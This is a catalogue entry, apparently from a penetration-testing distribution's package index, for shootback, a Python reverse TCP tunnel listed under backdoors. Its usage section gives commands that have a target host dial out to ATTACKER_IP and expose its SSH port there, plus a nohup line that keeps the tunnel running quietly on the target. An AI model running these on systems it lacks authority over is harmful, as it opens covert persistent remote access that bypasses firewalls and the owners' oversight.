---
name: "shootback"
categories:
  - blackarch-backdoor
version: "85.2c6e6a8"
homepage: "https://github.com/aploium/shootback"
packaged-by: [blackarch]
blackarch-builddate: "2026-04-05"
build-system: scripts
license: MIT
meta-checked: "2026-11-09"
github-repo: "aploium/shootback"
github-stars: 976
github-pushed: "2026-04-03"
github-archived: false
github-issues: 16
github-match: "exact"
gh-checked: "2026-11-07"
worth: 5.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 2
gh-activity-checked: "2026-11-09"
---

# shootback

> Reverse TCP tunnel: the machine behind NAT/firewall dials out to your listener, and you reach its services by connecting to the listener — no inbound ports needed.

## What it's for

shootback is a reverse TCP tunnel built on the Python standard library alone (`master.py` needs Python 3.4+, the `slaver` runs on 2.7 or 3.4+, no external dependencies). The `slaver` runs on the host stuck behind NAT and initiates an outbound connection to your `master`; you then connect to a second port on the master and your traffic is relayed through that outbound link to a TCP service reachable from the slaver host. That covers reaching an internal SSH/VNC/HTTP service when you control a box inside the network but cannot listen inbound, publishing a private site, or connecting to dynamic-IP devices. The slaver-master link can be wrapped with SSL, and any TCP service works (HTTP, FTP, proxies, SSH, VNC) — shootback only moves bytes, it does not proxy or encrypt the payload protocol itself.

No corpus evidence — derived from upstream documentation.

## Typical use cases

### Bring an internal web service out through NAT

Reach a web service that sits next to the slaver host.

```
python3 master.py -m 0.0.0.0:10000 -c 127.0.0.1:10080
python3 slaver.py -m ATTACKER_IP:10000 -t example.com:80
curl -v -H "host: example.com" 127.0.0.1:10080
```

Outcome: the master listens on :10000 for slaver connections and :10080 for you; the slaver dials out to the master and binds the tunnel to example.com:80; requests to 127.0.0.1:10080 return the HTML content from example.com.

### Tunnel SSH with encryption between slaver and master

Reach the slaver host's SSH daemon through the encrypted tunnel.

```
python3 master.py -m 0.0.0.0:10000 -c 0.0.0.0:10022 --ssl
python3 slaver.py -m ATTACKER_IP:10000 -t 127.0.0.1:22 --ssl
ssh -p 10022 user@ATTACKER_IP
```

Outcome: SSH sessions to the master's :10022 are relayed through the slaver to port 22 on the slaver's host; `--ssl` encrypts only the slaver-master link, not your connection to the master.

### Keep the slaver running unattended on the target

Detach the tunnel client so it survives the shell that launched it.

```
nohup python3 slaver.py -m ATTACKER_IP:10000 -t 127.0.0.1:22 -q &
```

Outcome: the slaver daemonizes quietly (`-q` suppresses output) and keeps the tunnel up until the process is killed; the master keeps forwarding the whole time.
